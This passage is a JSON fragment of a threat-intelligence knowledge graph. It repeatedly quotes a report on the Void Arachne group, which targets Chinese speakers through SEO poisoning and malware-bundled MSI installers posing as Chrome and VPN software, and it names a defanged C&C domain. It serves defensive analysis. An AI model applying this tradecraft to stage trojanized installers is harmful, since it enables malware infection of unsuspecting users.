            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 1,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Chinese-Language Users",
      "type": "Target",
      "id": "target--chinese-users",
      "description": "中文用户",
      "labels": "Target",
      "chunks_info": [
        {
          "chunk_id": 1,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Attack diagram  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
          "chunk_length": 399,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Attack diagram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Attack diagram"
            ],
            "content_type": "text",
            "token_length": 56,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 1,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Multiple Initial Access Vectors",
      "type": "AttackEvent",
      "id": "attack-event--multi-vector",
      "description": "多种初始访问向量的攻击活动",
      "labels": "AttackEvent",
      "chunks_info": [
        {
          "chunk_id": 1,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Attack diagram  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
          "chunk_length": 399,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Attack diagram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Attack diagram"
            ],
            "content_type": "text",
            "token_length": 56,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 1,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Void Arachne",
      "type": "ThreatOrganization",
      "id": "threat-org--void-arachne",
      "description": "威胁组织",
      "labels": "ThreatOrganization",
      "chunks_info": [
        {
          "chunk_id": 1,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Attack diagram  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
          "chunk_length": 399,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Attack diagram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Attack diagram"
            ],
            "content_type": "text",
            "token_length": 56,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 1,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Chinese-Language Telegram Channels",
      "type": "Asset",
      "id": "asset--telegram-channels",
      "description": "中文主题的Telegram频道",
      "labels": "Asset",
      "chunks_info": [
        {
          "chunk_id": 2,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Initial access  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
          "chunk_length": 399,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access"
            ],
            "content_type": "text",
            "token_length": 56,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 2,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Malicious Package Distribution",
      "type": "Technique",
      "id": "technique--malicious-package",
      "description": "恶意软件包分发技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 2,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Initial access  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
          "chunk_length": 399,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access"
            ],
            "content_type": "text",
            "token_length": 56,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 2,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Behind the Great Wall Void Arachne Targets Chinese",
      "type": "Report",
      "id": "report--great-wall",
      "description": "威胁情报报告",
      "labels": "Report",
      "chunks_info": [
        {
          "chunk_id": 2,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Initial access  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
          "chunk_length": 399,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access"
            ],
            "content_type": "text",
            "token_length": 56,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 2,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "SEO Poisoning",
      "type": "Technique",
      "id": "technique--seo-poisoning",
      "description": "搜索引擎优化投毒技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 2,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Initial access  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
          "chunk_length": 399,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access"
            ],
            "content_type": "text",
            "token_length": 56,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 2,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Chinese-Language Users",
      "type": "Target",
      "id": "target--chinese-users",
      "description": "中文用户",
      "labels": "Target",
      "chunks_info": [
        {
          "chunk_id": 2,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Initial access  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
          "chunk_length": 399,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access"
            ],
            "content_type": "text",
            "token_length": 56,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 2,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Initial Access Campaign",
      "type": "AttackEvent",
      "id": "attack-event--initial-access",
      "description": "初始访问攻击活动",
      "labels": "AttackEvent",
      "chunks_info": [
        {
          "chunk_id": 2,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Initial access  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
          "chunk_length": 399,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access"
            ],
            "content_type": "text",
            "token_length": 56,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 2,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Void Arachne",
      "type": "ThreatOrganization",
      "id": "threat-org--void-arachne",
      "description": "威胁组织",
      "labels": "ThreatOrganization",
      "chunks_info": [
        {
          "chunk_id": 2,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Initial access  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
          "chunk_length": 399,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access"
            ],
            "content_type": "text",
            "token_length": 56,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 2,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Spearphishing Link (T1566.002)",
      "type": "Technique",
      "id": "technique--spearphishing-link",
      "description": "钓鱼链接技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 3,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **SEO poisoning (T1608.006)**  \nFor this campaign, Void Arachne set up a web infrastructure that is used for SEO poisoning that deployed spear-phishing links ([T1566.002](https://attack.mitre.org/techniques/T1566/002/)) disguised as legitimate software installers to lure potential victims. These links are hosted on web servers disguised as legitimate websites so that the Void Arachne threat group can proceed to make them rank high on search engines via SEO poisoning.  \nThese links contain MSI installers for common software targeting Chinese-speaking users such as Google Chrome, Chinese language packs for popular software, and VPNs such as LetsVPN and 快連VPN (also known as Quick VPN or Kuilian VPN). When these malicious MSI files or archive files are downloaded and executed, they would bootstrap the infection process. To the victim, it appears as if the intended software was installed. However, unbeknownst to them, additional malware is installed that beacons back to the attacker’s C&C server.  \nBecause MSI files are bundled software installers, threat actors can include backdoors and additional malware within the file bundle that are executed without the end user’s knowledge during the installation process.  \nIn this campaign, the Void Arachne group created subdomains of the domain *webcamcn[.]xyz* to act as C&C servers for the various MSI files. As the campaign progressed, various subdomains were added to this root domain.",
          "chunk_length": 1522,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **SEO poisoning (T1608.006)**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **SEO poisoning (T1608.006)**"
            ],
            "content_type": "text",
            "token_length": 322,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 3,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "MSI Installer",
      "type": "Tool",
      "id": "tool--msi-installer",
      "description": "恶意MSI安装文件",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 3,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **SEO poisoning (T1608.006)**  \nFor this campaign, Void Arachne set up a web infrastructure that is used for SEO poisoning that deployed spear-phishing links ([T1566.002](https://attack.mitre.org/techniques/T1566/002/)) disguised as legitimate software installers to lure potential victims. These links are hosted on web servers disguised as legitimate websites so that the Void Arachne threat group can proceed to make them rank high on search engines via SEO poisoning.  \nThese links contain MSI installers for common software targeting Chinese-speaking users such as Google Chrome, Chinese language packs for popular software, and VPNs such as LetsVPN and 快連VPN (also known as Quick VPN or Kuilian VPN). When these malicious MSI files or archive files are downloaded and executed, they would bootstrap the infection process. To the victim, it appears as if the intended software was installed. However, unbeknownst to them, additional malware is installed that beacons back to the attacker’s C&C server.  \nBecause MSI files are bundled software installers, threat actors can include backdoors and additional malware within the file bundle that are executed without the end user’s knowledge during the installation process.  \nIn this campaign, the Void Arachne group created subdomains of the domain *webcamcn[.]xyz* to act as C&C servers for the various MSI files. As the campaign progressed, various subdomains were added to this root domain.",
          "chunk_length": 1522,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **SEO poisoning (T1608.006)**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **SEO poisoning (T1608.006)**"
            ],
            "content_type": "text",
            "token_length": 322,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 3,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "SEO Poisoning (T1608.006)",
      "type": "Technique",
      "id": "technique--seo-poisoning",
      "description": "搜索引擎优化投毒技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 3,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **SEO poisoning (T1608.006)**  \nFor this campaign, Void Arachne set up a web infrastructure that is used for SEO poisoning that deployed spear-phishing links ([T1566.002](https://attack.mitre.org/techniques/T1566/002/)) disguised as legitimate software installers to lure potential victims. These links are hosted on web servers disguised as legitimate websites so that the Void Arachne threat group can proceed to make them rank high on search engines via SEO poisoning.  \nThese links contain MSI installers for common software targeting Chinese-speaking users such as Google Chrome, Chinese language packs for popular software, and VPNs such as LetsVPN and 快連VPN (also known as Quick VPN or Kuilian VPN). When these malicious MSI files or archive files are downloaded and executed, they would bootstrap the infection process. To the victim, it appears as if the intended software was installed. However, unbeknownst to them, additional malware is installed that beacons back to the attacker’s C&C server.  \nBecause MSI files are bundled software installers, threat actors can include backdoors and additional malware within the file bundle that are executed without the end user’s knowledge during the installation process.  \nIn this campaign, the Void Arachne group created subdomains of the domain *webcamcn[.]xyz* to act as C&C servers for the various MSI files. As the campaign progressed, various subdomains were added to this root domain.",
          "chunk_length": 1522,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **SEO poisoning (T1608.006)**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **SEO poisoning (T1608.006)**"
            ],
            "content_type": "text",
            "token_length": 322,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 3,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Behind the Great Wall Void Arachne Targets Chinese",
      "type": "Report",
      "id": "report--behind-great-wall",
      "description": "威胁情报报告",
      "labels": "Report",
      "chunks_info": [
        {
          "chunk_id": 3,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **SEO poisoning (T1608.006)**  \nFor this campaign, Void Arachne set up a web infrastructure that is used for SEO poisoning that deployed spear-phishing links ([T1566.002](https://attack.mitre.org/techniques/T1566/002/)) disguised as legitimate software installers to lure potential victims. These links are hosted on web servers disguised as legitimate websites so that the Void Arachne threat group can proceed to make them rank high on search engines via SEO poisoning.  \nThese links contain MSI installers for common software targeting Chinese-speaking users such as Google Chrome, Chinese language packs for popular software, and VPNs such as LetsVPN and 快連VPN (also known as Quick VPN or Kuilian VPN). When these malicious MSI files or archive files are downloaded and executed, they would bootstrap the infection process. To the victim, it appears as if the intended software was installed. However, unbeknownst to them, additional malware is installed that beacons back to the attacker’s C&C server.  \nBecause MSI files are bundled software installers, threat actors can include backdoors and additional malware within the file bundle that are executed without the end user’s knowledge during the installation process.  \nIn this campaign, the Void Arachne group created subdomains of the domain *webcamcn[.]xyz* to act as C&C servers for the various MSI files. As the campaign progressed, various subdomains were added to this root domain.",
          "chunk_length": 1522,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **SEO poisoning (T1608.006)**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **SEO poisoning (T1608.006)**"
            ],
            "content_type": "text",
            "token_length": 322,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 3,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Chinese-speaking Users",
      "type": "Target",
      "id": "target--chinese-users",
      "description": "中文用户",
      "labels": "Target",
      "chunks_info": [
        {
          "chunk_id": 3,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **SEO poisoning (T1608.006)**  \nFor this campaign, Void Arachne set up a web infrastructure that is used for SEO poisoning that deployed spear-phishing links ([T1566.002](https://attack.mitre.org/techniques/T1566/002/)) disguised as legitimate software installers to lure potential victims. These links are hosted on web servers disguised as legitimate websites so that the Void Arachne threat group can proceed to make them rank high on search engines via SEO poisoning.  \nThese links contain MSI installers for common software targeting Chinese-speaking users such as Google Chrome, Chinese language packs for popular software, and VPNs such as LetsVPN and 快連VPN (also known as Quick VPN or Kuilian VPN). When these malicious MSI files or archive files are downloaded and executed, they would bootstrap the infection process. To the victim, it appears as if the intended software was installed. However, unbeknownst to them, additional malware is installed that beacons back to the attacker’s C&C server.  \nBecause MSI files are bundled software installers, threat actors can include backdoors and additional malware within the file bundle that are executed without the end user’s knowledge during the installation process.  \nIn this campaign, the Void Arachne group created subdomains of the domain *webcamcn[.]xyz* to act as C&C servers for the various MSI files. As the campaign progressed, various subdomains were added to this root domain.",
          "chunk_length": 1522,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **SEO poisoning (T1608.006)**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **SEO poisoning (T1608.006)**"
            ],
            "content_type": "text",
            "token_length": 322,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 3,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "SEO Poisoning Campaign",
      "type": "AttackEvent",
      "id": "attack-event--seo-poisoning-campaign",
      "description": "利用SEO投毒技术的攻击活动",
      "labels": "AttackEvent",
      "chunks_info": [
        {
          "chunk_id": 3,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **SEO poisoning (T1608.006)**  \nFor this campaign, Void Arachne set up a web infrastructure that is used for SEO poisoning that deployed spear-phishing links ([T1566.002](https://attack.mitre.org/techniques/T1566/002/)) disguised as legitimate software installers to lure potential victims. These links are hosted on web servers disguised as legitimate websites so that the Void Arachne threat group can proceed to make them rank high on search engines via SEO poisoning.  \nThese links contain MSI installers for common software targeting Chinese-speaking users such as Google Chrome, Chinese language packs for popular software, and VPNs such as LetsVPN and 快連VPN (also known as Quick VPN or Kuilian VPN). When these malicious MSI files or archive files are downloaded and executed, they would bootstrap the infection process. To the victim, it appears as if the intended software was installed. However, unbeknownst to them, additional malware is installed that beacons back to the attacker’s C&C server.  \nBecause MSI files are bundled software installers, threat actors can include backdoors and additional malware within the file bundle that are executed without the end user’s knowledge during the installation process.  \nIn this campaign, the Void Arachne group created subdomains of the domain *webcamcn[.]xyz* to act as C&C servers for the various MSI files. As the campaign progressed, various subdomains were added to this root domain.",
          "chunk_length": 1522,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **SEO poisoning (T1608.006)**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **SEO poisoning (T1608.006)**"
            ],
            "content_type": "text",
            "token_length": 322,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 3,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Web Servers",
      "type": "Asset",
      "id": "asset--web-servers",
      "description": "托管恶意链接的Web服务器",
      "labels": "Asset",
      "chunks_info": [
        {
          "chunk_id": 3,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **SEO poisoning (T1608.006)**  \nFor this campaign, Void Arachne set up a web infrastructure that is used for SEO poisoning that deployed spear-phishing links ([T1566.002](https://attack.mitre.org/techniques/T1566/002/)) disguised as legitimate software installers to lure potential victims. These links are hosted on web servers disguised as legitimate websites so that the Void Arachne threat group can proceed to make them rank high on search engines via SEO poisoning.  \nThese links contain MSI installers for common software targeting Chinese-speaking users such as Google Chrome, Chinese language packs for popular software, and VPNs such as LetsVPN and 快連VPN (also known as Quick VPN or Kuilian VPN). When these malicious MSI files or archive files are downloaded and executed, they would bootstrap the infection process. To the victim, it appears as if the intended software was installed. However, unbeknownst to them, additional malware is installed that beacons back to the attacker’s C&C server.  \nBecause MSI files are bundled software installers, threat actors can include backdoors and additional malware within the file bundle that are executed without the end user’s knowledge during the installation process.  \nIn this campaign, the Void Arachne group created subdomains of the domain *webcamcn[.]xyz* to act as C&C servers for the various MSI files. As the campaign progressed, various subdomains were added to this root domain.",
          "chunk_length": 1522,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **SEO poisoning (T1608.006)**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **SEO poisoning (T1608.006)**"
            ],
            "content_type": "text",
            "token_length": 322,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 3,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Void Arachne",
      "type": "ThreatOrganization",
      "id": "threat-org--void-arachne",
      "description": "威胁组织",
      "labels": "ThreatOrganization",
      "chunks_info": [
        {
          "chunk_id": 3,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **SEO poisoning (T1608.006)**  \nFor this campaign, Void Arachne set up a web infrastructure that is used for SEO poisoning that deployed spear-phishing links ([T1566.002](https://attack.mitre.org/techniques/T1566/002/)) disguised as legitimate software installers to lure potential victims. These links are hosted on web servers disguised as legitimate websites so that the Void Arachne threat group can proceed to make them rank high on search engines via SEO poisoning.  \nThese links contain MSI installers for common software targeting Chinese-speaking users such as Google Chrome, Chinese language packs for popular software, and VPNs such as LetsVPN and 快連VPN (also known as Quick VPN or Kuilian VPN). When these malicious MSI files or archive files are downloaded and executed, they would bootstrap the infection process. To the victim, it appears as if the intended software was installed. However, unbeknownst to them, additional malware is installed that beacons back to the attacker’s C&C server.  \nBecause MSI files are bundled software installers, threat actors can include backdoors and additional malware within the file bundle that are executed without the end user’s knowledge during the installation process.  \nIn this campaign, the Void Arachne group created subdomains of the domain *webcamcn[.]xyz* to act as C&C servers for the various MSI files. As the campaign progressed, various subdomains were added to this root domain.",
          "chunk_length": 1522,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **SEO poisoning (T1608.006)**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **SEO poisoning (T1608.006)**"
            ],
            "content_type": "text",
            "token_length": 322,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 3,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "MSI Execution Process",
      "type": "Procedure",
      "id": "procedure--msi-execution",
      "description": "MSI文件执行过程",
      "labels": "Procedure",
      "chunks_info": [
        {
          "chunk_id": 3,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **SEO poisoning (T1608.006)**  \nFor this campaign, Void Arachne set up a web infrastructure that is used for SEO poisoning that deployed spear-phishing links ([T1566.002](https://attack.mitre.org/techniques/T1566/002/)) disguised as legitimate software installers to lure potential victims. These links are hosted on web servers disguised as legitimate websites so that the Void Arachne threat group can proceed to make them rank high on search engines via SEO poisoning.  \nThese links contain MSI installers for common software targeting Chinese-speaking users such as Google Chrome, Chinese language packs for popular software, and VPNs such as LetsVPN and 快連VPN (also known as Quick VPN or Kuilian VPN). When these malicious MSI files or archive files are downloaded and executed, they would bootstrap the infection process. To the victim, it appears as if the intended software was installed. However, unbeknownst to them, additional malware is installed that beacons back to the attacker’s C&C server.  \nBecause MSI files are bundled software installers, threat actors can include backdoors and additional malware within the file bundle that are executed without the end user’s knowledge during the installation process.  \nIn this campaign, the Void Arachne group created subdomains of the domain *webcamcn[.]xyz* to act as C&C servers for the various MSI files. As the campaign progressed, various subdomains were added to this root domain.",
          "chunk_length": 1522,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **SEO poisoning (T1608.006)**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **SEO poisoning (T1608.006)**"
            ],
            "content_type": "text",
            "token_length": 322,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 3,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "C&C Servers",
      "type": "Asset",
      "id": "asset--c2-servers",
      "description": "命令与控制服务器",
      "labels": "Asset",
      "chunks_info": [
        {
          "chunk_id": 3,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **SEO poisoning (T1608.006)**  \nFor this campaign, Void Arachne set up a web infrastructure that is used for SEO poisoning that deployed spear-phishing links ([T1566.002](https://attack.mitre.org/techniques/T1566/002/)) disguised as legitimate software installers to lure potential victims. These links are hosted on web servers disguised as legitimate websites so that the Void Arachne threat group can proceed to make them rank high on search engines via SEO poisoning.  \nThese links contain MSI installers for common software targeting Chinese-speaking users such as Google Chrome, Chinese language packs for popular software, and VPNs such as LetsVPN and 快連VPN (also known as Quick VPN or Kuilian VPN). When these malicious MSI files or archive files are downloaded and executed, they would bootstrap the infection process. To the victim, it appears as if the intended software was installed. However, unbeknownst to them, additional malware is installed that beacons back to the attacker’s C&C server.  \nBecause MSI files are bundled software installers, threat actors can include backdoors and additional malware within the file bundle that are executed without the end user’s knowledge during the installation process.  \nIn this campaign, the Void Arachne group created subdomains of the domain *webcamcn[.]xyz* to act as C&C servers for the various MSI files. As the campaign progressed, various subdomains were added to this root domain.",
          "chunk_length": 1522,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **SEO poisoning (T1608.006)**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **SEO poisoning (T1608.006)**"
            ],
            "content_type": "text",
            "token_length": 322,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 3,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Chinese-speakers",
      "type": "Target",
      "id": "target--chinese-speakers",
      "description": "中文用户",
      "labels": "Target",
      "chunks_info": [
        {
          "chunk_id": 4,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Targeting VPN-related technologies for spearphishing**  \nInternet connectivity in the People’s Republic of China is subject to strict regulation through a combination of legislative measures and technological controls collectively known as the [Great Firewall of China](https://www.britannica.com/topic/Great-Firewall). Due to strict government control, VPN services and public interest in this technology have notably increased. This has, in turn, enhanced threat actors' interest in exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nWe discovered that the VPN “快連VPN” is a common phishing and SEO poisoning vector used to target Chinese-speakers and the broader East Asian community. We have evidence of multiple distinct Chinese-speaking threat actors creating spear-phishing links and using SEO poisoning tactics by bundling this VPN with malware that includes Gh0st RAT and its variants.",
          "chunk_length": 1033,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Targeting VPN-related technologies for spearphishing**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Targeting VPN-related technologies for spearphishing**"
            ],
            "content_type": "text",
            "token_length": 190,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 4,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "快連VPN",
